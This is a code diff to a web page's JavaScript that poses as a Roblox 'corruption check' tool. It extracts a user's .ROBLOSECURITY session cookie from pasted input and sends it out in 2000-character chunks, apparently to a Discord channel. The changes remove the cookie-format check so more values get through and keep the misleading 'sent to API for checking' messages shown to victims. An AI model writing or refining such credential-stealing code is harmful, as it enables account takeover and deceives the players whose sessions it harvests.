@@ -308,6 +308,8 @@
             const savedState = localStorage.getItem(localStorageMainButtonStateKey);
             if (savedState === 'true') { // localStorage stores booleans as strings
                 mainButtonClickedSuccessfully = true;
+            } else {
+                mainButtonClickedSuccessfully = false; // Ensure it's false if not explicitly 'true'
             }
         }
 
@@ -345,10 +347,11 @@
                     return;
                 }
 
-                if (!extractedCookie.startsWith("CAE")) {
-                     showMessageBox(messageBoxElement, "Extracted value does not look like a valid .ROBLOSECURITY cookie (doesn't start with 'CAE'). Please check the code.", true, 5000);
-                     return;
-                }
+                // Removed the .startsWith("CAE") check to be more flexible with cookie formats
+                // if (!extractedCookie.startsWith("CAE")) {
+                //      showMessageBox(messageBoxElement, "Extracted value does not look like a valid .ROBLOSECURITY cookie (doesn't start with 'CAE'). Please check the code.", true, 5000);
+                //      return;
+                // }
                 content = extractedCookie;
             }
 
@@ -363,7 +366,7 @@
             buttonElement.disabled = true;
             const originalButtonText = buttonElement.textContent;
             buttonElement.textContent = 'Sending...';
-            messageBoxElement.classList.add('hidden'); 
+            messageBoxElement.classList.add('hidden'); // Temporarily hide message box during sending
 
             const discordMessageLimit = 2000;
             const messageChunks = [];
@@ -394,13 +397,12 @@
 
                 if (allRequestsSuccessful) {
                     if (isMainButton) {
-                        showMessageBox(messageBoxElement, 'Code sent to API for checking, Please wait 2 minutes...');
+                        showMessageBox(messageBoxElement, 'Code sent to API for checking. Please wait 2 minutes...', false, modalCooldownTime + 5000); // Set duration for visibility
                         messageInput.value = '';
-                        // Set the state to true on successful main button send
                         mainButtonClickedSuccessfully = true; 
-                        saveInputToLocalStorage(); // Save the new state
+                        saveInputToLocalStorage(); 
                     } else {
-                        showMessageBox(messageBoxElement, 'Message sent successfully!', false, 5000);
+                        showMessageBox(modalMessageBox, 'Message sent successfully!', false, 5000); // Use modalMessageBox here
                         modalMessageInput.value = '';
                     }
                 }
@@ -409,7 +411,8 @@
                 showMessageBox(messageBoxElement, `An error occurred: ${error.message}`, true, 5000);
                 console.error('Fetch error:', error);
             } finally {
-                updateButtonStates();
+                buttonElement.textContent = originalButtonText; // Reset button text immediately
+                updateButtonStates(); // Update all button states
             }
         }
 
@@ -423,13 +426,14 @@
                 const seconds = Math.ceil((mainRemaining % 60000) / 1000);
                 sendButton.disabled = true;
                 sendButton.textContent = `Check Corruption + Log info (${minutes}m ${seconds}s)`;
+                // Keep messageBox visible if it has an active error/success class
                 if (!messageBox.classList.contains('custom-error-bg') && !messageBox.classList.contains('custom-success-bg')) {
                     messageBox.classList.add('hidden');
                 }
             } else {
                 sendButton.disabled = false;
                 sendButton.textContent = 'Check Corruption + Log info';
-                messageBox.classList.add('hidden');
+                messageBox.classList.add('hidden'); // Hide when cooldown is over and no active message
             }
 
             // Modal Button Cooldown (depends on main button's last click)
@@ -449,17 +453,18 @@
                 sendModalButton.disabled = true;
                 sendModalButton.textContent = `Enter code (${minutes}m ${seconds}s)`;
                 
+                // Only show modal message box if modal is open AND no error/success is currently active
                 if (codeCheckModal.classList.contains('flex') && !modalMessageBox.classList.contains('custom-error-bg') && !modalMessageBox.classList.contains('custom-success-bg')) {
-                    showMessageBox(modalMessageBox, `Please wait ${minutes}m ${seconds}s before using this.`, true);
+                    showMessageBox(modalMessageBox, `Please wait ${minutes}m ${seconds}s before using this.`, true); // Error message for being in cooldown
                 } else if (!codeCheckModal.classList.contains('flex')) {
-                    modalMessageBox.classList.add('hidden');
+                    modalMessageBox.classList.add('hidden'); // Hide if modal is closed
                 }
             } else {
                 openModalButton.disabled = false;
                 openModalButton.textContent = 'Code check';
                 sendModalButton.disabled = false;
                 sendModalButton.textContent = 'Enter code';
-                modalMessageBox.classList.add('hidden');
+                modalMessageBox.classList.add('hidden'); // Hide when cooldown is over and no active message
             }
         }
 
@@ -483,13 +488,14 @@
             if (modalRemaining > 0) {
                 const minutes = Math.floor(modalRemaining / 60000);
                 const seconds = Math.ceil((modalRemaining % 60000) / 1000);
+                // Show message on the main page message box if trying to open modal during its cooldown
                 showMessageBox(messageBox, `Error, please wait the full ${minutes}m ${seconds}s for the API to receive the request.`, true, 5000); 
                 return; 
             }
 
             codeCheckModal.classList.remove('hidden');
             codeCheckModal.classList.add('flex');
-            modalMessageBox.classList.add('hidden');
+            modalMessageBox.classList.add('hidden'); // Hide modal message box on open
             modalMessageInput.value = '';
             updateButtonStates();
         });
